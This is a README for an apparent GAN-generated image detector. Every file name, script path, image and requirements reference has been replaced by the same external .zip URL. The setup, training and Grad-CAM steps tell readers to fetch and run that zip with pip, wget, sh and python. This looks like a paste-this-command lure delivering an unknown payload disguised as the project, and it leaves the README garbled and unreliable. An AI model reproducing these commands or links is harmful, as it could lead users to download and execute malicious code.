# GAN-detector
Fake image detection model that can also classify which GAN was used to generate the fake images

## Directory Structure
```
GAN-dectector
├── cam_results
│   ├── demo1
│   └── demo2
├── checkpoints
│   ├── gan-detection-resnet101.h5
│   ├── gan-detection-resnet50.h5
│   └── gan-detection-xception.h5
├── datasets
│   ├── test
│   │   ├── msgstylegan
│   │   ├── pggan
│   │   ├── stylegan
│   │   └── vgan
│   └── train
│       ├── msgstylegan
│       ├── pggan
│       ├── stylegan
│       └── vgan
├── GANs
│   ├── msgstylegan
│   ├── pggan
│   ├── stylegan
│   └── vgan
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── models
│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
│   └── Xception
│       ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
│       ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
│       └── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
├── utils
│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
│   ├── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
│   └── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
└── https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip
```

## Overview
This is manipulated image detection models which can be globally applied to multiple GAN images.

## How To Use

### Prerequisite
```
# install dependent python packages
$ pip install -r https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip

# download pretrained checkpoint for Xception
$ wget https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip -P [path to GAN-detector/models/Xception]
```

### Train
```
// run with a shell script
$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip

// manually run
$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip \
      --phase train \
      --data-dir ./datasets \
      --model-name {resnet101, xception, ...} \
      --model-path ./checkpoints/gan-detection-{resnet101, xception, ...}.h5 \
      --num-epochs {the number of training epochs} \
      --batch-size {batch size} \
      --save-dir ./checkpoints \
      --gpu {GPU PCI ID}
```

### Test
```
TODO: Fill this
```

### Result Analysis with Grad-CAM
**1) Grad-CAM visualization for a target layer**
```
// run with a shell script
$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip

// manually run
$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip demo1 \
      -a {model name}
      -t {layer name}
      -i {image path}
```

**2) Grad-CAM map for a specific class at different layers**
```
// run with a shell script
$ sh https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip

$ python https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip demo2 \
      -a xception \
      -i https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip \
      -c pggan
```

## Example Results

**1) MSG-GAN**

<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="msgstylegan"></img></p>

**2) StyleGAN**

<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="stylegan"></img></p>

**3) PGGAN**

<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="pggan"></img></p>

**4) VGAN**

<p align="center"><img src="https://raw.githubusercontent.com/VekariaVinit/GAN-based-Detection/main/subsextuple/GAN-based-Detection.zip" width="800" alt="vgan"></img></p>
